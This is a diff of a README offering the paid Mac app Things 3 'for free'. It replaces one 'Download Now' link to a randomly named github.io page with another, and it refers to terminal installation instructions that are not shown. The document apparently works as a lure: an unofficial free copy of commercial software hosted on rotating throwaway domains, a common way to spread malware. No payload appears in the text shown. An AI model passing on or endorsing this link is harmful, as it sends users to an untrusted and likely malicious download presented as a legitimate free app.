@@ -3,7 +3,7 @@
 
 Effortlessly manage your tasks with Things 3, a powerful and intuitive productivity app for Mac. Follow the instructions below to install it for free and streamline your workflow.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge)](https://fituganshfgh.github.io/.github/things3)
+[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge)](https://mrboomzeus519.github.io/gimronus/things3)
 
 If the download button doesn’t work, follow the terminal installation instructions below.
 
